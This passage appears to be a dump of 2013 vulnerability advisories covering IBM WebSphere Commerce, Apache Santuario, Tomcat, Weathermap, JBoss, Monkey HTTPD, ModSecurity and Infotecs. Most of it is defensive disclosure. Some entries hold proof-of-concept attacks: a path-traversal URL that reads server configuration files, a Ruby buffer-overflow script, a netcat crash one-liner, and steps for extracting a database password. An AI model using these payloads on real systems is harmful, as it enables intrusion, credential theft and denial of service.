with a static IV, which is a very common implementation mistake. Use of
a static IV can allow for information leaks, and while it is typically not
a critical flaw in this context, it does provide an indication that CBC
mode encryption may be in use.
- From there, IBM fix packs were obtained for WebSphere Commerce and the relevant
classes were decompiled. Analysis of the decryption process revealed that the
received krypto token is first base64 decoded, then decrypted, and finally
decoded from UTF-8 (all prior to interpretation as a set of name-value pairs).
In most cases, if an error occurs during these first few steps, the decryption
routine returns a null value, which is interpreted by the application as if the
krypto parameter were never provided by the user. However, if execution
arrives at the UTF-8 decoding step and an error occurs in the interpretation
of UTF-8 code points, the method uses System.exit() to end the process.
In practice, this exit condition causes the server to return an HTTP response
with a zero-length body. This difference in behavior can be utilized to
create a ""padding oracle"", which allows one to determine if a given
ciphertext's padding (after decryption) is correct. Given that the
encryption mode is CBC, this makes the application vulnerable to padding
oracle attacks which are discussed further in [4]. (Note that this is not
the only way in which a padding oracle can be constructed based on
application behavior, but merely the most reliable known method.)
A script was developed using Bletchley's POA class to validate that this flaw
exists in a real-world deployment. Encrypted tokens were successfully decrypted.
In some cases, sensitive information (including a user password) was observed
to exist in the recovered plaintext.
Note that it would also be possible to craft malicious krypto token values that
specify nearly arbitrary plaintext name/value pairs after decryption. The
implementation of this attack would be somewhat tricky, given the static nature
of the initialization vector, but the plaintext format of the krypto tokens is
fairly forgiving, which would allow an attacker to work around this limitation.
Versions Affected
~---------------~
VSR confirmed that WebSphere Commerce versions 5.6.X and 6.X are vulnerable.
IBM indicates the following specific versions are affected:
* WebSphere Commerce versions 7.0.0.0 to 7.0.0.7
* WebSphere Commerce versions 6.0.0.0 to 6.0.0.11
* WebSphere Commerce 5.6.1.0 to 5.6.1.5
* Earlier out of support versions may be affected
Vendor Response
~-------------~
The following timeline details IBM's response to the reported issue:
2013-02-14 IBM was provided a draft security advisory with recommendations
for remediation.
2013-02-15 IBM acknowledged receipt of advisory.
2013-02-25 IBM acknowledged the vulnerability exists.
2013-03-20 IBM obtained a CVE identifier and estimated patch availability in
mid-June.
2013-06-04 VSR requested an update for the patch release. IBM indicated it
was still expected for mid-June.
2013-06-13 IBM indicated a fix would be released the following day and would
notify VSR upon release.
2013-06-14 IBM released an advisory [5].
2013-06-15 IBM notified VSR that the advisory was made available.
2013-06-19 VSR advisory released
Technical Recommendations Provided to IBM
~---------------------------------------~
IBM should update the WebSphere Commerce implementation to add a message
authentication code (MAC) to the existing krypto token. This MAC should be
applied to the full ciphertext of the parameter and verified before any
decryption is attempted. In addition, the initialization vector (IV) of the
encrypted data should be randomized to prevent information leaks. Ensure the IV
is included along with the ciphertext in the token and that the MAC is applied
to this value along with the ciphertext. For instance, a safer implementation
might read (in pseudocode):
iv = get_random_bytes(8)
ciphertext = encrypt(cipher_key, iv, plaintext)
integrity = mac(mac_key, iv + ciphertext)
krypto = base64(iv + ciphertext + mac)
Once again, the mac should be verified prior to any decryption operation.
Recommendation for Users
~----------------------~
Apply the security update released by IBM as soon as possible. The following
instructions are provided in [5]:
""For supported versions, open a Problem Management Record (PMR) with IBM
WebSphere Commerce Support to request an Interim Fix for APAR JR46386 and
include your WebSphere Commerce version including Fix Pack level. For out of
support versions, we recommend that you upgrade to a supported version.""
Common Vulnerabilities and Exposures (CVE) Information
~----------------------------------------------------~
The Common Vulnerabilities and Exposures (CVE) project has assigned
the number CVE-2013-0523 to this issue. This is a candidates for
inclusion in the CVE list (http://cve.mitre.org), which standardizes
names for security problems.
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
References:
1. http://www.ibm.com/software/products/us/en/websphere-commerce
2.
http://pic.dhe.ibm.com/infocenter/wchelp/v6r0m0/index.jsp?topic=%2Fcom.ibm.commerce.admin.doc%2Ftasks%2Ftdc_encryparam.htm
3. http://code.google.com/p/bletchley/
4. http://www.skullsecurity.org/blog/2013/padding-oracle-attacks-in-depth
5. http://www-01.ibm.com/support/docview.wss?uid=swg21640597
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
This advisory is distributed for educational purposes only with the sincere
hope that it will help promote public safety. This advisory comes with
absolutely NO WARRANTY; not even the implied warranty of merchantability or
fitness for a particular purpose. Neither Virtual Security Research, LLC nor
the author accepts any liability for any direct, indirect, or consequential
loss or damage arising from use of, or reliance on, this information.
See the VSR disclosure policy for more information on our responsible
disclosure practices:
http://www.vsecurity.com/company/disclosure
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Copyright 2013 Virtual Security Research, LLC. All rights reserved.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.12 (GNU/Linux)
iQIVAwUBUcHqyNaINF9fnpkCAQJfPhAAoiLqc/3grGNAyZCnNOtdnOu1nw7GUXil
d1NbwhPc6XTB8l1+aXhx1cymdz6fzzG1NUOduGjDrNfBVlzMRk9Ohsx2QVQZF2V5
SOlblGYIyB/Tl0yVz5+cvqzCEB/7/2l8BTvU4nVAb93n1JYaH0epcTAbHy3Y4cAP
Uanua9i8QEj/Y64elIqcTJcfJ18MmVxDO7BFcgdc8e/3GJNq4ikvVB2OIDougm9Q
keej/hVfkOyQqA65qYFJ5f1BOQ9yU3rqBYceMdjeM0c4FCisCPjbarEEHXnwv1yf
5RLkAF9uz6+sljBiNSjiocsrrYgcXIQtMjFHYLVMXq/37zBZONk9CWvrIeXWTe+6
Do154+haTEXQDTUKIcrqPPxTu+cbNsneKfk1XOn4vz6fnsyeVVwYiXvBUXw/gd7p
PJ2IgBZSfQaMfA58X7q5DyqSaUH1EKbzDoeSMW6iZQuEyHam9MUkL7AfJDiKbXb4
gjb3oeU7yEv37nPdMM6yYlj3OMwFK9ieakuM5owVYfQIMiXr6KLrC0o4aJwQk0fZ
CRtZn/XAEtK2tRhNG/L1LfytBWQDeZeUtoqGJrfZEAQh7DLQLe0QKHNXaI70QYE2
RFZhLxARw99x+Yhotk4lQieGOPIA4lzY8r9kA+hOc7HWoLdJCdbjXoxhCG17XJmX
Uco18m9gQY8=
=egUe
-----END PGP SIGNATURE-----"
8452,Re: CVE-2013-2156: Apache Santuario C++ heap overflow vulnerability,,CVE-2013-2156,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
CVE-2013-2156: Apache Santuario XML Security for C++ contains heap
overflow while processing InclusiveNamespace PrefixList
Severity: Critical
Vendor: The Apache Software Foundation
Versions Affected: Apache Santuario XML Security for C++ library versions
prior to V1.7.1
Description: A heap overflow exists in the processing of the PrefixList
attribute optionally used in conjunction with Exclusive Canonicalization,
potentially allowing arbitary code execution. If verification of
the signature occurs prior to actual evaluation of a signing key,
this could be exploited by an unauthenticated attacker.
Mitigation: Applications using library versions older than V1.7.1 should
upgrade as soon as possible. Distributors of older versions should apply
the
patches from this subversion revision:
http://svn.apache.org/viewvc?view=revision&revision=1493961
Applications that prevent the use of Exclusive Canonicalization through
the examination of signature content prior to verification are immune
to this issue.
Credit: This issue was reported by James Forshaw, Context Information
Security
References: http://santuario.apache.org/
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.13 (Darwin)
iQIcBAEBCgAGBQJRv5RVAAoJEDeLhFQCJ3lik6UP/jBeDwbmEIiTCZ0VrZll0IvF
w8AnEw+5e3pdVVi7F+dS6FkbgL3dnklkWzIk5KT2slhuJ9Is+LHXCShdlBLOC1v5
Vv3in185YO+VH4dTb5y4hVyeZ1I+eQQA6yCvuSfUSRja7LKjDIK1KIcF9DbH+p+u
YoRlKUaqKlTBAJGekZwLCgPS7r7z/TBYNRhn5LEg4MKrLhopUjiXZT838h+LRko7
PgoYaq9z5KHJjhTP0OdBR8CiIPECf5Ewsjy2PORGeQ67IvtcLm4nWEa+XwUiH5Iv
sfQowtYtkkn1Utpfj+jiyknMlQKtVMmgEWk1a/DtzKBQYZ9SegIDNH6JFJTE+cYt
PQuOv7P3w73gotCsuK7pnCWCwK4iIBdp6tvculdXbrWl5RpR/xBOiNnkIKvu3gR3
pfQVl71+APswrSsCnrFNt4sWpYVhBwZtCMAI8LfJVswO0vy87S2H2tguLXXHz03s
eJ5c/UjNGP2JlXigsWYi3jmqQtotiQCpVy+WQF3WI+0t4N4IfYaUGv/2z+mQXY8q
DVtINxoUqjWACc1Vp+G+ISFaunOH/Q9S0ejb2kHeE+BLtbIlVvQRdhJtXuBuOVt8
q/gSUV+Iiu4o5Sg8DAjmRpDeTJ8wXfSuQwtcYhIZ+kbie6MiJjWOOV2gVbrZL16m
077pIfbZ/6I12+KyYsK8
=I064
-----END PGP SIGNATURE-----"
8453,CVE-2013-2155: Apache Santuario C++ denial of service vulnerability,,CVE-2013-2155,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
CVE-2013-2155: Apache Santuario XML Security for C++ contains denial
of service and hash length bypass issues while processing HMAC signatures
Severity: Critical
Vendor: The Apache Software Foundation
Versions Affected: Apache Santuario XML Security for C++ library versions
prior to V1.7.1
Description: A bug exists in the processing of the output length of an
HMAC-based XML Signature that would cause a denial of service when
processing specially chosen input. Exploitation of this issue does
not require authenticated content.
In very unusual cases, inputs could be chosen in such a way that
the fix for the issue in CVE-2009-0217 could be bypassed, enabling
improper verification of a signature.
Mitigation: Applications that support HMAC signatures and are using library
versions older than V1.7.1 should upgrade as soon as possible. Distributors
of older versions should apply the patches from this subversion revision:
http://svn.apache.org/viewvc?view=revision&revision=1493960
Credit: This issue was reported by James Forshaw, Context Information
Security
References: http://santuario.apache.org/
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.13 (Darwin)
iQIcBAEBCgAGBQJRv9gDAAoJEDeLhFQCJ3likjsP/2VC0FXAO39JWYLBPt8o48+Z
rwy0SFlqZrjcLkeC9dRvzw/EDItagyP+ir2raJhbIMzyLgHA/GSYolcrFVr5OEjK
sHXimW3c85bkjC9ygTyfXoXljwV3BNNjKvJ9ELDbt7LAVBxP/ngYIP49Ai9cGbLv
eLuvTs+GaFVUcA9w+fhyQEbIczhOhbtPM3ltugzQpLdu+xbpwkrvXL7Pge1U7KLg
9T23HpzEt/ye+RK/wih/0XntrSyHKqs1oPtyU6E8KZUFlRMFIZ541G933OVrt/HG
jdNH+0usEd3DzaCNtxf1lopLsVaPgbYcp1jOO2+JCQ97pLqtpL9qq/6asGtYViuT
lWt8hPispI6D00IDo+7iuuEokOlo3dWAJI9QZjRqYIPFE+rVHBNgUezYHv6d8Woc
Z1WWrFkCZEJhmqAylkHKHaEDPPiCINwtbzGRxFOBWuhU7Bcf1tdKDzGChyZVKz/l
A5IEQYw6pagSv8mMMhDOzKzJZSgH5mGQBmBwQ014/4/noD8zMdSsrQ/RRxmzpX9C
jIWVasOtpHQy/IJTjdjQcF4ZJvBz40i3VVQwhxHnYtl6NJXr1bGzqlC01G7nWWsG
dcBSB4MnNu+uYnev7CzlC4EZ27j2HgekmJ7GPWqKKj5R7rAFlsxjo50g1J7CUsJ3
g2CPt8V/THNSVKr26Hrz
=Z6W/
-----END PGP SIGNATURE-----"
8454,CVE-2013-2154: Apache Santuario C++ stack overflow vulnerability,,CVE-2013-2154,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
CVE-2013-2154: Apache Santuario XML Security for C++ contains a stack
overflow during XPointer evaluation
Severity: Critical
Vendor: The Apache Software Foundation
Versions Affected: Apache Santuario XML Security for C++ library versions
prior to V1.7.1
Description: A stack overflow, possibly leading to arbitrary code
execution, exists in the processing of malformed XPointer expressions
in the XML Signature Reference processing code.
An attacker could use this to exploit an application performing
signature verification if the application does not block the
evaluation of such references prior to performing the verification
step. The exploit would occur prior to the actual verification of
the signature, so does not require authenticated content.
Mitigation: Applications that do not otherwise prevent the evaluation of
XPointer expressions during signature verification and are using library
versions older than V1.7.1 should upgrade as soon as possible. Distributors
of older versions should apply the patches from this subversion revision:
http://svn.apache.org/viewvc?view=revision&revision=r1493959
The first chunk of the patch to DSIGReference.cpp is the relevant portion.
Credit: This issue was reported by James Forshaw, Context Information
Security
References: http://santuario.apache.org/
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.13 (Darwin)
iQIcBAEBCgAGBQJRv9OYAAoJEDeLhFQCJ3li8IgP/1kbxVPOdSXDqx4ER9oBU877
7Z8XwGw3vL1CUoyt1AWlElqJpgrUMP723fcLWJa3sfXiY6Pnp/+dxfiaoUCAa+OJ
qJS2/TUmc/1EwGc+hawvCJlItuKb7aOHhdPlOX3KuriTHnqnigTXkpF0n5oUd7Md
e0+XOIFcTpoudUUEfdiigBtJHBxv8Jfq3dvjCOD2aOpRCreEBEinykdxdXWX2onw
Ugj7b+FxH/d4eVSYS1vuIxLAVqJpgN4AlVV7kNzyp0ivPE3NgKYb946Kq5YNkYN3
Xj3uq+VW7NxWMzWn/Gl5GEgPGNdzTPVZ80dy/bOIw4dDUtA362axfO24I+Lmrobx
2/JhgeovwCbIrbeMVZOtWeSYoRFSFtf9WxKDVi+9a+53UtZOWCNhky48D9iU2OuA
fxEAeTmDH+Dx23w/bXezwI0X4l2hItBHd4+V59BP7p/90Vu3iBw9jez8lzQXWJ8G
hzUyxCdGN0hB3K+1pOesKTmD1zdy8u3L/FUz91gbB7ciivmvzsx5a5zB3BLzWSJF
3jgAwWaay4DZdL4YmCW3khr5xa05nR0LUqlS3xpTukrWfPqLdjJzBfeeDWWxMGib
N5dPaf+DMB9Q5TmLXb6j3tsEfCS+xqky+ryqsS8rGrrIcL1zW9HAlG+QELAC/t6q
bVctGmNMu7i+o9xXqUJ0
=7xZa
-----END PGP SIGNATURE-----"
8455,CVE-2013-2153: Apache Santuario C++ signature bypass vulnerability,,CVE-2013-2153,"CVE-2013-2153: Apache Santuario XML Security for C++ contains an
XML Signature Bypass issue
Severity: Critical
Vendor: The Apache Software Foundation
Versions Affected: Apache Santuario XML Security for C++ library versions
prior to V1.7.1
Description: The implementation of XML digital signatures in the
Santuario-C++ library is vulnerable to a spoofing issue allowing an
attacker to reuse existing signatures with arbitrary content.
The vulnerability affects only applications that do not perform
proper checking/analysis of the content of the Reference elements
in the Signature, but the bug exacerbates this problem by opening
such applications to attacks using arbitrary content, instead of
just attacks involving malicious, but signed, content.
Mitigation: Applications using library versions older than V1.7.1 should
upgrade as soon as possible. Distributors of older versions should apply
the
patches from this subversion revision:
http://svn.apache.org/viewvc?view=revision&revision=r1493959
Applications that appropriately examine the content of the signatures
they accept are immune to this issue. The only API provided for
this purpose in the library is to examine the individual Reference
elements to enforce limitations over their content, and doing so will
prevent this vulnerability. Developers with questions about this should
inquire on the Santuario project's mailing list.
Credit: This issue was reported by James Forshaw, Context Information
Security
References: http://santuario.apache.org/
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.13 (Darwin)
iQIcBAEBCgAGBQJRv9NrAAoJEDeLhFQCJ3liPjMQAL24TiWH2gr5O1cXSjoxjJwp
WqfKGUvIE2tYY5fx8X8dE5jkLNSDefD517HsEJgebIllDuqwzC8sakcwh7yrCX9x
eGimv9RY9q0FdFk9bGnYNAB01f4ILGB+YV8yI8+J8um1dfUne0GWSxn1NWG4M4Zp
iEBUcxaBcU9IUF1uNiDD3gcR+47wzTz6kMnWFxDNEl62FpIeUvvt0d6nwY7MZL7h
q2FDP1Bt3cYWvsbUS47CKC+Ep+H5DybYAWK+jtvOkfEbFT9x4dynG1nMCPDNuRCz
UMczJ+a48UpYZGu5lN2YHDjU5ZJOExhWfeXxwnbNxAg50HVkU0LsOjSP8feUSkki
WFhQjbBMnpv7LJS7GWd08CaIrkYYH2/aUmEKkQeIODKCrfbys19XHtENeWIfS6lM
uSQlKG+GTg8h/lADbLhbtCRK5n6mRI2Icb7PHI+r1fuJx7TpESregPST0HcPWroD
nKoeFz+oS5v9BDMGqjMxbNvgA38fhBnPwfvbpH6yzPnL8XDZAKiFytBC/ZWO/0JX
yc+RDdasJBEghlZwjXrk1l/GR1h87kMbwIBFUE0stmByT9x5SUzrghgP9U0lXWah
ykUVDyICd97YryJWhRrRLnQW78US4PVDA0hm4sIOlEqVdiWHCOkQ1+yDmXjbFKca
C56YjpUEMmP6CCsMfmhq
=x8kA
-----END PGP SIGNATURE-----"
8474,CVE-2013-3739 Local File Inclusion in Weathermap <= 0.97C,,CVE-2013-3739,"=============================================
WEBERA ALERT ADVISORY 01
- Discovered by: Anthony Dubuissez
- Severity: high
- CVE Request - 03/06/2013
- CVE Assign - 03/06/2013
- CVE Number - CVE-2013-3739
- Vendor notification - 03/06/2013
- Vendor reply - No reply
- Public disclosure - 10/06/2013
=============================================
I. VULNERABILITY -------------------------
Local File Inclusion in Weathermap <= 0.97C
II. BACKGROUND -------------------------
Network Weathermap is a network visualisation tool, to take data you already have and show you an overview of your network in map form. Support is built in for RRD, MRTG (RRD and old log-format), and tab-delimited text files. Other sources are via plugins or external scripts.
III. DESCRIPTION -------------------------
Network Weathermap 0.97C and lower versions contain a flaw that allows a local file inclusion attack. This flaw exists because the application does not properly sanitise the parameter ""mapname"" in the editor.php file. This allows an attacker to create a specially crafted URL to include any "".config"" file on the web server, you can bypass the "".config"" restriction filter with a php bug.
the editor.php must be enabled to successfully exploit.
IV. PROOF OF CONCEPT -------------------------
LFI: http://vulnerablesite.com/editor.php?action=show_config&mapname=../../../../../../../../../etc/apache2/apache2.conf
V. BUSINESS IMPACT -------------------------
LFI: With a php bug we can include any file that the webserver has right to read, including sensitive config files ( php file too, because it's not executed but read with fopen) .
VI. SYSTEMS AFFECTED -------------------------
Network Weathermap 0.97C and lower versions
VII. SOLUTION -------------------------
sanitize correctly the mapname parameter.
TEMP SOLUTION : disable editor.php
VIII. REFERENCES -------------------------
http://www.webera.fr/advisory-01-network-weathermap-local-file-inclusion-exploit
IX. CREDITS -------------------------
the vulnerability has been discovered by Anthony Dubuissez (anthony (dot) dubuissez (at) webera (dot) fr).
X. DISCLOSURE TIMELINE -------------------------
June 01, 2013: Vulnerability acquired by Webera
June 03, 2013: Sent to vendor.
June 06, 2013: No reply of vendor, sent second email.
June 10, 2013: No reply of vendor, Advisory published and sent to lists.
XI. LEGAL NOTICES -------------------------
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.Webera accepts no responsibility for any damage caused by the use or misuse of this information.
XII. FOLLOW US -------------------------
You can follow Webera, news and security advisories at:
On twitter : @erathemass"
8486,CVE-2013-3734 - JBoss AS Administration Console - Password Returned in Later Response,,CVE-2013-3734,"Product: Embedded Jopr - JBoss AS Administration Console
Vendor: Red Hat Middleware, LLC
Version: < 1.2
Tested Version: 1.2
Vendor Notified Date: May 29, 2013
Release Date: June 03, 2013
Risk: Moderate
Authentication: Required
Remote: Yes
Description:
Passwords submitted to the application are returned in clear form in later responses from the application. Although the password field is masked, it is visible via the page source regardless of SSL.
This behavior increases the risk that passwords will be captured by an attacker.
Specifically, this can be leveraged to pivot and gain access to configured databases by viewing the page source or using browser tools such as ""inspect element"" in chrome and firefox.
Successful exploitation of this vulnerability results in taking complete control of database servers.
Exploit steps for proof-of-concept:
1. Navigate to: JBossAS Servers> JBoss AS> Resources> Datasources
2. Select Datasource
3. View page source
4. Find input type=""password""
5. ""value="" will contain the database password.
6. Dump database.
Vendor Notified: Yes
Vendor Response: Does not consider this to be an exploitable security flaw due to type authenticated.
Reference:
CVE-2013-3734
http://www.halock.com/blog/cve-2013-3734-jboss-administration-console-password-returned-response/
amroot.com"
8491,CVE-2013-3843 Monkey HTTPD 1.2.0 - Buffer Overflow DoS Vulnerability With Possible Arbitrary Code Execution,,CVE-2013-3843,"1. Title
CVE-2013-3843 Monkey HTTPD 1.2.0 - Buffer Overflow DoS
Vulnerability With Possible Arbitrary Code Execution
2. Introduction
Monkey is a lightweight and powerful web server for
GNU/Linux.
It has been designed to be very scalable with low memory
and CPU consumption, the perfect solution for embedded
devices. Made for ARM, x86 and x64.
3. Abstract
A specially crafted request sent to the Monkey HTTPD
server triggers a buffer overflow which can be used to
control the flow of execution.
4. Report Timeline
2013-05-29
Discovered vulnerability via fuzzing
2013-05-30
Vendor Notification
5. Status
Published
6. Affected Products
Monkey HTTPD <= 1.2.0
7. Exploitation Technique
Remote
8. Details
Improper bounds checking while parsing headers allows
for an attacker to craft a request that will trigger a
buffer overflow during a call to memcpy() on line 268
in the file, mk_request.c.
9. Proof of Concept
The vulnerability can be exploited by remote attacker
without any special privileges. Under Ubuntu 13.04,
an offset of 2511 lines up the instruction pointer
with, 0x42424242.
#!/usr/bin/env ruby
require ""socket""
host = ""localhost""
port = 2001
s = TCPSocket.open(host, port)
buf = ""GET / HTTP/1.1 ""
buf << ""Host: "" + "" ""
buf << ""localhost ""
buf << ""Bad: ""
buf << ""A"" * 2511
buf << ""B"" * 4
s.puts(buf)
10. Solution
There is currently no solution.
11. Risk
Risk should be considered high since it can be shown that
the flow of execution can be controlled by an attacker.
12. References
http://bugs.monkey-project.com/ticket/182
13. Credits
Doug Prostko <dougtko[at]gmail[dot]com>
Vulnerability discovery"
8492,CVE-2013-3724 Monkey HTTPD 1.1.1 - Denial of Service Vulnerability,,CVE-2013-3724,"1. Title
CVE-2013-3724 Monkey HTTPD 1.1.1 - Denial of Service Vul-
nerability
2. Introduction
Monkey is a lightweight and powerful web server for
GNU/Linux.
It has been designed to be very scalable with low memory
and CPU consumption, the perfect solution for embedded
devices. Made for ARM, x86 and x64.
3. Abstract
The vulnerability is a denial of service which is caused
by sending a null byte in an HTTP request to the web
server.
4. Report Timeline
2013-05-23
Discovered vulnerability via fuzzing
2013-05-25
Vendor Notification
2013-05-26
Vendor Response/Feedback
2013-05-27
Vendor Fix/Patch
2013-05-28
Public disclosure
5. Status
Published
6. Affected Products
Monkey HTTPD 1.1.1
7. Exploitation Technique
Remote
8. Details
A bug discovered in Monkey's HTTP parser allows an
attacker to cause a segmentation fault in one of the
daemon's threads using a specially crafted request
containing a null byte. An attacker can crash all the
available threads by sending the specially crafted
request multiple times, rendering the server useless
for legitimate users.
9. Proof of Concept
The vulnerability can be exploited by remote attacker
without any special privileges. The placement of the
null byte within the request does not seem to have any
effect on the result. The null byte may even be used
instead of an HTTP method such as, GET. Below is an
example of how this bug can be manually triggered:
ruby -e 'puts ""GET /x00 HTTP/1.1 ""'|netcat localhost 2001
10. Solution
This vulnerability has been fixed for the 1.2.0 release.
11. Risk
The security risk of the DoS vulnerability is estimated
as low.
12. References
http://bugs.monkey-project.com/ticket/181
13. Credits
Doug Prostko <dougtko[at]gmail[dot]com>
Vulnerability discovery"
8512,[SECURITY][CVE-2013-2765][ModSecurity] Remote Null Pointer Dereference,,CVE-2013-2765,"CVE Number: CVE-2013-2765 / ModSecurity Remote Null Pointer Dereference
When ModSecurity receives a request body with a size bigger than the
value set by the ""SecRequestBodyInMemoryLimit"" and with a
""Content-Type"" that has no request body processor mapped to it,
ModSecurity will systematically crash on every call to
""forceRequestBodyVariable"" (in phase 1).
In addition to the segfault that occurs here, ModSecurity will not
remove the temporary request body file and the temporary directory
(set by the ""SecTmpDir"" directive) will keep growing until saturation.
Details : http://www.shookalabs.com/#advisory-cve-2013-2765
Exploit : https://github.com/shookalabs/exploits/blob/master/modsecurity_cve_2013_2765_check.py
Solution : Upgrade to 2.7.4 https://www.modsecurity.org"
8558,"CVE-2013-3496. Local privilege escalation vulnerability in Infotecs products (ViPNet ClientCoordinator, SafeDisk, Personal Firewall)",,CVE-2013-3496,"CVE-2013-3496. Local privilege escalation vulnerability in Infotecs products (ViPNet ClientCoordinator, SafeDisk, Personal Firewall)
CVE reference:
CVE-2013-3496
Credit:
Maksim Chudakov (@MChudakov)
Andrey Kurtasanov(andreykurtasanov gmail com)
Severity:
Medium
LocalRemote:
Local
Vulnerability Class:
Privilege Escalation
Vendor URL:
http://www.infotecs.biz/
Affected OS:
Windows
Vulnerable systems:
ViPNet Client 3.2.10 (15632) and prior
ViPNet Coordinator 3.2.10 (15632) and prior
ViPNet SafeDisk 4.1 (0.5643) and prior
VipNet Personal Firewall 3.1 and prior
Possibly same issues in other Infotecs products and other versions
Overview:
A local privilege escalation vulnerability exists in the Infotecs products (ViPNet Client, SafeDisk, Personal Firewall and possibly other products), which could be exploited by an attacker to execute commands on the affected machine under the context of the SYSTEM user or user with local administrative privileges.
Technical Background:
The vulnerability exists because Infotecs products installs to folder with insecure permissions. ""Everyone"" group has ""Full Control"" rights to the files/folders in the following path: ""%Program Files%Infotecs[product_name]"". It means that any unprivileged user can modify, delete or change permissions of any file in data the folder consists of data, executable and configuration files.
Solution:
1) Request a patch from Vendor or
2) Go to every executable and dll file within a ViPNet folder and change permissions manually
Disclosure Timeline:
25/03/2013 Initial vendor notification
08/04/2013 Vendor response that patches has been released
20/05/2013 Advisory released"
8587,[SECURITY] CVE-2012-3544 Chunked transfer encoding extension size is not limited,,CVE-2012-3544,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2012-3544 Chunked transfer encoding extension size is not limited
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- - Tomcat 7.0.0 to 7.0.29
- - Tomcat 6.0.0 to 6.0.36
Description:
When processing a request submitted using the chunked transfer encoding,
Tomcat ignored but did not limit any extensions that were included. This
allows a client to perform a limited DOS by streaming an unlimited
amount of data to the server.
Mitigation:
Users of affected versions should apply one of the following mitigations:
- - Tomcat 7.0.x users should upgrade to 7.0.30 or later
- - Tomcat 6.0.x users should upgrade to 6.0.37 or later
Credit:
This issue was identified by Steve Jones.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html
http://tomcat.apache.org/security-6.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Thunderbird - http://www.enigmail.net/
iQIcBAEBAgAGBQJRjLHYAAoJEBDAHFovYFnnNacQAKZ8VVSZkh1Tz1hkenVQH9ic
rZGNE3dzfdum8sbL18iObOyt7b7iJMDwSv96sD6Ig+6EgiqRJGcj65a9DOIoyNlD
dmYT8qj4wK2OUsefUpfX0RQHgAZcZMRHX6UcgBETgVDTVcWoZ3lDWEBCYap9CTLf
2MX34mMawDp+WEXloDIvxtSC5q5u2nW/O4UJHH+jaPnnmYmghHqb2yh9Tkjj3fkG
HUtJlK0WuL9TM7IlQySPUHw98BN46illVu8go6xVslE3CLzXIOOOelOnyDH9IFoF
D4SbhKb0nSwSi9aUJsjLNAmgx9Cj5shYyWQSP+CCNXfpOaBz11R3lxSmRvbRBDTf
lW8SPgKiCIjXSbbKtZzhl9cu21i4yZFwaKm22wKSRoEWghHs5mCNcVwt+qNE34Zx
v2eliMYymkc/EDy/aCTz4DwWhGP9XLi8hOtPkSFB46jLLbUOJcAcy3jPnPa9X8Gq
FX07EAncpG8uC9wpSd1Vtr8SPJlbRbkwY2NJ9MaRuEtetbC/Gpq8I5fT7MuBM7X9
8r+GoEcjTMYGWb7T+vGzg5HpcnOVY07wvG1Kvdp/cLxxAjGONsAwvZQ1D6VAjkJx
bgDOGWqTDm1c7U3MIY+CdrGKpKaRCoCI6UX5vlD/+H3NYjMKadUwpDrFNCwSMF4T
7QzwCUk2DGUI/n7o7S5n
=vhss
-----END PGP SIGNATURE-----"
8588,[SECURITY] CVE-2013-2067 Session fixation with FORM authenticator,,CVE-2013-2067,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2013-2067 Session fixation with FORM authenticator
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- - Tomcat 7.0.0 to 7.0.32
- - Tomcat 6.0.21 to 6.0.36
Description:
FORM authentication associates the most recent request requiring
authentication with the current session. By repeatedly sending a request
for an authenticated resource while the victim is completing the login
form, an attacker could inject a request that would be executed using
the victim's credentials. This attack has been prevented by changing the
session ID prior to displaying the login page as well as after the user
has successfully authenticated.
Mitigation:
Users of affected versions should apply one of the following mitigations:
- - Tomcat 7.0.x users should upgrade to 7.0.33 or later
- - Tomcat 6.0.x users should upgrade to 6.0.37 or later
Credit:
This issue was identified by the Apache Tomcat Security Team.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html
http://tomcat.apache.org/security-6.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Thunderbird - http://www.enigmail.net/
iQIcBAEBAgAGBQJRjLHUAAoJEBDAHFovYFnnUnEP/0R3q0uPTHRXem+Jlx6DLLfs
jL3TD1idxqHcUDJhX/mnePwTxIle5lAbPZn6hBknFPdD77kjyflq4TB3ZPUipsip
s2bKzGGlDDZwzRIY46ZqBRcVXuemCu73BjFNLBP6CvjQwm1/wFGuOS+oRRKKigwQ
Ew1Mau3c6Sb0VIED4yrgvhPwJwdi1+rA1TO87p/8rxQIS9CTcUy6J/MICPdvIQiI
zIfr7pIRSNDk9JeC6Ybr/SC5lYqAox6eqOYYNoQ+5zQ1BcCw/eQgWpm4WYM2IDV3
2eNbjS/dylz5zBQEDbzz9VtReBTncQLF6Do2KDhWxkaUaX2oaOTPKlLiyL0gwA4e
IDpHDl9D5mLmBaJi4Lz14cwey5wNgs28ZqX9JCUaLz7qc03J9Au7PrplOr3Xth/Z
rQqeKVxFZKaIKQOm2NKs7v7bZAhzp/mKt/u9ndnk0uKk2Tf3i6QJ1GtICTY22eB6
Eh4s/o2BJDgGop0P7cTmrAv1uKu6/72eoUJBMyyGCIN67URzVZRwMQnmW6TqZoBt
tASvlTVD53HV3aPdhDHDjP9x/6V6cODD29fzn5op59BWhMVuzf+1lhqphJT0hlQQ
lnuf4H9UWG8I8/OzN7XNabIbVuYyhjYWnt8HI/8N/4cAHfA67fXkcbDqleKOd6qo
Pcp0qDLiZqVFSotSkVFl
=hWpv
